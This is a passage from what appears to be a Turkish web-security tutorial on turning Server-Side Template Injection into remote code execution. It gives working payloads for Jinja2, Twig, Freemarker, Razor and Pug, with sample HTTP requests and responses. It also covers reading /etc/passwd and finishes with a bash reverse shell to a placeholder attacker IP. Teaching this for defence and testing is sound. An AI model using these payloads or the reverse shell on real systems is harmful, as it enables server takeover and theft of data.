SSTI zafiyetinin en tehlikeli sonucu, saldırganın sunucu üzerinde keyfi komutlar çalıştırmasına olanak tanıyan **Uzaktan Kod Çalıştırma (Remote Code Execution - RCE)** yetkisi elde etmesidir. Bir önceki bölümde dosya okumak için sandbox'tan nasıl kaçılabileceğini gördük. Aynı teknikleri kullanarak, dosya okumak yerine sunucuda komut çalıştıran fonksiyonlara erişebiliriz.

### Python (Jinja2) Ortamında RCE

Python tabanlı şablon motorlarında RCE elde etmek, genellikle

__builtins__

modülü üzerinden

__import__

veya

eval

gibi tehlikeli fonksiyonlara erişmeyi içerir. En yaygın yöntemlerden biri,

os

modülünü import edip

popen()

veya

system()

fonksiyonlarını kullanmaktır.

**Payload:**

{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}

**Payload Açıklaması:** Bu payload, bir önceki bölümde gördüğümüz dosya okuma payload'ına çok benzer. Farklı olan kısımlar şunlardır:

- ['__import__']('os')
    
    : Bu ifade, Python'un 
    
    __import__()
    
     fonksiyonunu kullanarak 
    
    os
    
     modülünü dinamik olarak yükler. Bu, bize 
    
    os
    
     modülünün tüm fonksiyonlarına erişim imkanı verir.
- .popen('id')
    
    : Yüklenen 
    
    os
    
     modülü üzerinden 
    
    popen()
    
     fonksiyonunu çağırır. 
    
    popen()
    
     (process open), belirtilen komutu (
    
    id
    
     komutu) bir alt süreçte çalıştırır ve bu sürecin çıktısını okumak için bir dosya benzeri nesne döndürür.
- .read()
    
    : 
    
    popen()
    
     tarafından döndürülen nesnenin çıktısını okur.

**HTTP İsteği:** Saldırgan,

id

komutunu çalıştırmak için payload'ı enjekte eder. Bu komut, mevcut kullanıcının kimlik bilgilerini (UID, GID) döndürür.

Request

```auto
GET /profile?name={{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }} HTTP/1.1
Host: vulnerable-site.com
...
```

**HTTP Yanıtı:** Sunucu,

id

komutunun çıktısını doğrudan yanıta yazar. Bu, komutun sunucuda başarıyla çalıştığını doğrular.

Response

```auto
HTTP/1.1 200 OK
...

<h1>Hoş Geldin, uid=33(www-data) gid=33(www-data) groups=33(www-data)
!</h1>
```

Bu noktadan sonra saldırgan,

id

yerine

ls -la

,

cat /etc/shadow

veya bir reverse shell başlatan herhangi bir komutu çalıştırabilir.

### PHP (Twig) Ortamında RCE

PHP tabanlı şablon motoru olan Twig, varsayılan olarak oldukça güvenli bir sandbox'a sahiptir. Ancak, geliştiriciler bazen

registerUndefinedFilterCallback

gibi tehlikeli fonksiyonları şablon içinde erişilebilir kılabilir veya yanlış yapılandırabilir.

Eğer

exec

,

system

veya

passthru

gibi PHP fonksiyonları doğrudan veya dolaylı olarak erişilebilir durumdaysa, RCE elde etmek mümkün olabilir.

Örneğin,

system

fonksiyonunun bir filtre olarak çağrılabildiği bir senaryoyu ele alalım.

**Payload:**

{{ ['id']|filter('system') }}

**HTTP İsteği:**

Request

```auto
GET /profile?name={{ ['id']|filter('system') }} HTTP/1.1
Host: vulnerable-site.com
...
```

**HTTP Yanıtı:**

Response

```auto
HTTP/1.1 200 OK
...

<h1>Hoş Geldin, uid=33(www-data) gid=33(www-data) groups=33(www-data)
!</h1>
```

Bazı durumlarda, saldırganın kendi filtresini tanımlaması gerekebilir. Bu genellikle iki adımlı bir saldırı gerektirir.

**Adım 1: Filtre Yönlendirmesini Tanımla** Bu payload,

exec

fonksiyonunu tüm tanımsız filtrelere yönlendirmek için kullanılır. Böylece tanımsız bir filtre çağrıldığında Twig bu filtreyi

exec()

fonksiyonuna geçirerek çalıştırır.

Payload:

{{ _self.env.registerUndefinedFilterCallback("exec") }}

**Adım 2: Tanımsız Bir Filtre Kullanarak Komut Çalıştır** Bu payload, tanımsız bir filtre çağrısını tetikleyerek

id

komutunu çalıştırır.

Payload:

{{ _self.env.getFilter("id") }}

**HTTP İsteği (Tek Adımlı Basit Örnek):** Aşağıdaki örnek,

passthru

fonksiyonunun

passthru

adıyla bir filtre olarak zaten tanımlı olduğu varsayımsal bir durumu gösterir. Bu durumda

passthru

filtresi doğrudan PHP'nin

passthru()

fonksiyonunu çağırır.

Request

```auto
GET /profile?name={{ "ls -la"|passthru }} HTTP/1.1
Host: vulnerable-site.com
...
```

**HTTP Yanıtı:** Sunucu,

ls -la

komutunun çıktısını yanıta basar.

Response

```auto
HTTP/1.1 200 OK
...

<h1>Hoş Geldin, total 24
drwxr-xr-x 1 www-data www-data 4096 Dec 1 10:00 .
drwxr-xr-x 1 root     root     4096 Nov 20 08:00 ..
-rw-r--r-- 1 www-data www-data  220 Dec 1 09:50 index.php
-rw-r--r-- 1 www-data www-data 5432 Dec 1 10:00 config.php
!</h1>
```

Twig'de RCE elde etmek, büyük ölçüde uygulamanın Twig ortamını nasıl yapılandırdığına bağlıdır ve genellikle Jinja2'ye göre daha zordur. Ancak, yanlış yapılandırmalar her zaman mümkündür ve bu da ciddi güvenlik riskleri oluşturur.

### Diğer Motorlarda RCE Örnekleri

Sadece Python ve PHP değil, diğer dillerdeki şablon motorları da SSTI zafiyetlerinden etkilenebilir.

Java (Freemarker) Ortamında RCE

Freemarker,

Execute

gibi tehlikeli nesnelere erişim sağlanabildiğinde RCE için bir yol sunar.

**Payload:**

<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }

- Bu payload, 
    
    freemarker.template.utility.Execute
    
     sınıfından yeni bir nesne oluşturur ve bu nesneyi 
    
    ex
    
     değişkenine atar. Ardından, bu nesneyi kullanarak 
    
    id
    
     komutunu çalıştırır.

.NET (Razor) Ortamında RCE

Razor şablon motoru, C# kodunu doğrudan çalıştırabilir. Bu, komut yürütmeyi oldukça basit hale getirir.

**Payload:**

@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }

- Bu payload, .NET'in 
    
    Process.Start
    
     metodunu kullanarak 
    
    whoami
    
     komutunu çalıştırır.

NodeJS (Pug/Jade) Ortamında RCE

NodeJS tabanlı şablon motorları, NodeJS'in global

process

nesnesine erişim sağlayarak RCE'ye imkan tanıyabilir.

**Payload:**

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

- Bu payload, 
    
    child_process
    
     modülünü yükleyerek 
    
    cat /etc/passwd
    
     komutunu senkronize bir şekilde çalıştırır ve çıktısını ekrana basar.

### Reverse Shell Alma

RCE yetkisi elde edildikten sonra, saldırganlar genellikle daha stabil ve interaktif bir komut satırı oturumu elde etmek için **reverse shell** (ters kabuk) almayı hedefler. Bu, zafiyetli sunucunun, saldırganın kontrolündeki bir makineye bağlanmasını sağlayarak bir shell oturumu açmasıdır.

**Adım 1: Saldırgan Makinesinde Dinleyici Başlatma** Saldırgan, kendi makinesinde belirli bir portu dinlemek için

netcat

(veya

nc

) gibi bir araç kullanır.

Saldırgan Makine

```auto
nc -lvp 4444
```

Bu komut, 4444 portuna gelecek olan bağlantıları dinlemeye başlar.

**Adım 2: Reverse Shell Payload'ını Enjekte Etme** Saldırgan, hedef sunucunun kendi makinesine bağlantı kurmasını sağlayacak bir payload'u, zafiyet barındıran uygulamaya gönderir.

**Bash Reverse Shell Payload'ı:**

bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1

Bu payload, daha önce gördüğümüz RCE tekniği içine gömülür:

```auto
{{ ['bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1']|filter('system') }}
```

Bu payload gönderildiğinde, zafiyetli sunucu saldırganın makinesindeki 4444 portuna bağlanır ve saldırgan,

nc

dinleyicisi üzerinde sunucunun komut satırına erişim elde eder.
